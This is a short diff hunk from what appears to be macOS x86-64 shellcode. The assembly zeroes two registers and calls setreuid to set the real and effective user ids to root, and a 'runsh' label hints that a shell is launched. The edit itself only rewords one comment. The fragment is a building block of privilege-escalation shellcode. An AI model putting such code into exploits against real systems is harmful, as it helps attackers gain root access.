@@ -15,7 +15,7 @@ runsh:
 
 setreuid: ; set real and user id for maximum privileges
   xor rax, rax
-  mov rax, 0x2000017          ; 23 = setreuid
+  mov rax, 0x2000017          ; call setreuid
   xor rdi, rdi                ; real userid
   xor rsi, rsi                ; effective userid
   syscall                     ; setreuid(ruid, euid)
